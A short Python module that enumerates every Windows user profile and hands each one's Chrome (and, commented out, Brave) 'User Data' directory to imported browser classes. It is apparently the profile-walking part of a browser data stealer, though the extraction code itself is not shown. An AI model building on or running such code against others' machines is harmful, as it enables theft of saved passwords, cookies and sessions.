from brave import Brave
from chrome import Chrome

class Windows:
    def __init__(self):
        users = self.get_users()
        for x in users:
            if x != "All Users" and x != "desktop.ini":
                #Brave("C://Users/"+x, "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
                Chrome("C://Users/"+x, "\\AppData\\Local\\Google\\Chrome\\User Data")
    
    def get_users(self):
        import os
        users = []
        for x in os.listdir("C://Users"):
            users.append(x)
        return users